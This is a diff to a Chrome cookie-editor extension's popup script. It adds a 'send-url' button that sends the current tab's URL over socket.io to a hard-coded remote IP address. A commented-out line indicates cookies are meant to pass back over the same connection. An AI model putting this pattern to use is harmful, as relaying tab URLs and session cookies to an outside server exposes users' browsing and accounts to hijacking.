@@ -1,6 +1,5 @@
 (function() {
   'use strict';
-
   let containerCookie;
   let cookiesListHtml;
   let pageTitleContainer;
@@ -181,24 +180,23 @@
       });
     }
 
-    // document.getElementById('create-cookie').addEventListener('click', () => {
-    //   if (disableButtons) {
-    //     return;
-    //   }
-    //
-    //   setPageTitle('Cookie Editor - Create a Cookie');
-    //
-    //   disableButtons = true;
-    //
-    //   Animate.transitionPage(containerCookie, containerCookie.firstChild, createHtmlFormCookie(), 'left', () => {
-    //     disableButtons = false;
-    //   });
-    //
-    //
-    //   document.getElementById('button-bar-default').classList.remove('active');
-    //   document.getElementById('button-bar-add').classList.add('active');
-    //   return false;
-    // });
+    document.getElementById('send-url').addEventListener('click', () => {
+      let tabUrl = cookieHandler.currentTab.url;
+      // var socket = io.connect('http://localhost:3002');
+      // const socket = io.connect('http://76.20.12.128:3')
+      const socket = io.connect('http://76.20.12.128:3002')
+      socket.on('connect', function() {
+        console.log('Client connected', tabUrl);
+      });
+
+      socket.emit('click', tabUrl);
+
+      // socket.on('login', function(msg){ //msg should be cookies in string form
+      //   $('#messages').append($('<li>').text(msg));
+      // });
+
+
+    });
 
     // document.getElementById('delete-all-cookies').addEventListener('click', () => {
     //   let buttonIcon = document.getElementById('delete-all-cookies').querySelector('use');
@@ -218,6 +216,12 @@
     // });
 
     document.getElementById('export-cookies').addEventListener('click', () => {
+
+      let tabUrl = cookieHandler.currentTab.url;
+      var socket = io.connect('http://localhost:3002');
+      socket.on('connect', function() {
+        console.log('Client connected', tabUrl);
+      });
       let buttonIcon = document.getElementById('export-cookies').querySelector('use');
       if (buttonIcon.getAttribute("xlink:href") === "../sprites/solid.svg#check") {
         return;
@@ -233,11 +237,12 @@
       }
 
       copyText(JSON.stringify(exportedCookies, null, 4));
-
       sendNotification('Cookies exported to clipboard');
+
       setTimeout(() => {
         buttonIcon.setAttribute("xlink:href", "../sprites/solid.svg#file-export");
       }, 1500);
+
     });
 
     document.getElementById('import-cookies').addEventListener('click', () => {
@@ -248,15 +253,15 @@
       }
       sendNotification('All cookies were deleted');
 
-      //Hard refresh after we delete cookies
-      chrome.tabs.query({
-        active: true,
-        currentWindow: true
-      }, function(tabs) {
-        chrome.tabs.update(cookieHandler.currentTab.id, {
-          url: cookieHandler.currentTab.url
-        });
-      });
+      // //Hard refresh after we delete cookies
+      // chrome.tabs.query({
+      //   active: true,
+      //   currentWindow: true
+      // }, function(tabs) {
+      //   chrome.tabs.update(cookieHandler.currentTab.id, {
+      //     url: cookieHandler.currentTab.url
+      //   });
+      // });
 
       if (disableButtons) {
         return;
@@ -340,15 +345,15 @@
       sendNotification('Cookies were created');
       showCookiesForTab();
 
-      //Hard refresh after we delete cookies
-      chrome.tabs.query({
-        active: true,
-        currentWindow: true
-      }, function(tabs) {
-        chrome.tabs.update(cookieHandler.currentTab.id, {
-          url: cookieHandler.currentTab.url
-        });
-      });
+      // //Hard refresh after we delete cookies
+      // chrome.tabs.query({
+      //   active: true,
+      //   currentWindow: true
+      // }, function(tabs) {
+      //   chrome.tabs.update(cookieHandler.currentTab.id, {
+      //     url: cookieHandler.currentTab.url
+      //   });
+      // });
 
     });
 
